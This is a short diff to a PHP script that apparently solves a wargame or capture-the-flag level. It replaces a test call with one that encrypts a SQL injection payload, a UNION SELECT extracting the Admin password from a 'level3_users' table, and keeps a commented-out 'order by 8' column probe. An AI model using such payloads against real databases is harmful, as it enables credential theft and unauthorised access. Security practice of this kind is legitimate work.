@@ -46,6 +46,6 @@
 		}
 		return false;
 	}
-	echo encrypt("Admin");
-	echo decrypt("MDQyMjExMDE0MTgyMTQw")
+	echo encrypt("' union select 1,password,3,4,5,6,7 from level3_users where username='Admin'#");
+	//echo encrypt("1' order by 8#")
 ?>
